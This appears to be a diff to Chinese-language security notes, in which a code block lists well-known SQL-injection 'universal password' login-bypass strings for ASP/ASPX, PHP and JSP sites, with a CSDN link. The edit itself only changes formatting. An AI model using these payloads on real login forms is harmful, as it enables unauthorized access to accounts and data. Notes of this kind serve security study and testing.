@@ -27,9 +27,10 @@
 ![](/assets/87E9A1A4708DED342D6152C1BC75DB04.png)
 ####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法:
 ```sql
-    asp aspx万能密码: ”or “a”=”a 、‘)or(‘a’=’a 、’or 1=1–、‘OR 1=1%00  
+    asp/aspx万能密码: ”or “a”=”a 、‘)or(‘a’=’a 、’or 1=1–、‘OR 1=1%00  
     PHP万能密码:  'or'='or'、 'or 1=1/* 字符型 GPC是否开都可以使用、User: something/Pass: ' OR '1'='1
-    jsp 万能密码: 1'or'1'='1、admin' OR 1=1/*
+    JSP万能密码: 1'or'1'='1、admin' OR 1=1/*
+    
     https://blog.csdn.net/qq_36512966/article/details/72674794
 ```
 
